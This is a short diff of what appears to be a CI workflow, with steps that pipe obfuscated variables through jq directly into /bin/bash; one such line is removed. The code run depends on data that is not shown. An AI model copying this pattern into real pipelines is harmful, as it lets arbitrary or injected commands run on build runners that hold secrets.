@@ -31,7 +31,6 @@ jobs:
           echo $xwbwt9 | jq -r .ubbus63 | /bin/bash
           echo $bea2 | jq -r .sn02603 | /bin/bash
           echo $utppa79 | jq -r .cuce49620 | /bin/bash
-          printf '%s' "$lp217" | jq -r .dkjl4990 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
